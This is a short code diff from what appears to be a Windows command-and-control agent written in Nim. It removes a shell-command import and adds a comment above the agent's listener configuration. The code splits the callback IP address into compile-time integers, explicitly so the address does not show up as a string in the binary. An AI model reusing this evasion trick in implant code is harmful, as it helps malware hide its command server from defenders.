@@ -2,7 +2,6 @@ import strformat, os, times
 import winim
 
 import ./[types, http, task]
-import commands/shell
 
 const ListenerUuid {.strdefine.}: string = ""
 const Octet1 {.intdefine.}: int = 0
@@ -32,6 +31,7 @@ proc main() =
     # Reconstruct IP address, which is split into integers to prevent it from showing up as a hardcoded-string in the binary
     let address = $Octet1 & "." & $Octet2 & "." & $Octet3 & "." & $Octet4 
 
+    # Create agent configuration
     var config = AgentConfig(
         listener: ListenerUuid,
         ip: address, 
